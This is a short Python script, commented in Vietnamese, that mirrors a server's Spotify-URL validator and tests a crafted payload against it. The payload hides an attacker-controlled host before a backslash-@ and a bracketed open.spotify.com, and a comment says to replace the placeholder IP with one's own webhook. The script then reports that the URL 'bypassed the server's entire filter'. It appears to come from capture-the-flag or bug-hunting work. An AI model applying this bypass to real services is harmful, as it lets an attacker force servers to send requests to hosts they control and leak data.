from urllib.parse import urlparse, unquote

def test_parser(url):
    print(f"[*] Input URL: {url}\n")
    
    # Logic của server
    decoded = unquote(url)
    parsed = urlparse(decoded)
    
    # In ra cách Python phân tích các thành phần
    print("--- CÁCH PYTHON PHÂN TÍCH ---")
    print(f"1. Scheme   : {parsed.scheme}")
    print(f"2. Netloc   : {parsed.netloc}")
    print(f"   + Username : {parsed.username}")
    print(f"   + Hostname : {parsed.hostname}")
    print(f"3. Path     : {parsed.path}")
    print("-" * 29 + "\n")

    # Mô phỏng lại các vòng kiểm tra của hàm is_valid_spotify_url
    print("--- KIỂM TRA ĐIỀU KIỆN ---")
    
    if parsed.scheme not in ["http", "https"]:
        print("[FAIL] Scheme không hợp lệ.")
        return
    else:
        print("[PASS] Scheme hợp lệ (http/https).")

    if parsed.hostname != "open.spotify.com":
        print("[FAIL] Hostname không khớp.")
        return
    else:
        print("[PASS] Hostname khớp hoàn toàn!")

    if not parsed.path.startswith("/embed/"):
        print("[FAIL] Path không bắt đầu bằng /embed/")
        return
    else:
        print("[PASS] Path hợp lệ!")

    if '"' in decoded:
        print("[FAIL] Có chứa dấu ngoặc kép.")
        return

    print("\n[V] KẾT LUẬN: URL đã bypass thành công toàn bộ filter của Server!")


# Thử nghiệm với Payload khai thác của chúng ta
MY_SERVER_IP = "127.0.0.1:8000" # Thay bằng IP/Domain webhook của bạn
payload = f"http://{MY_SERVER_IP}\@[open.spotify.com]/embed/"

test_parser(payload)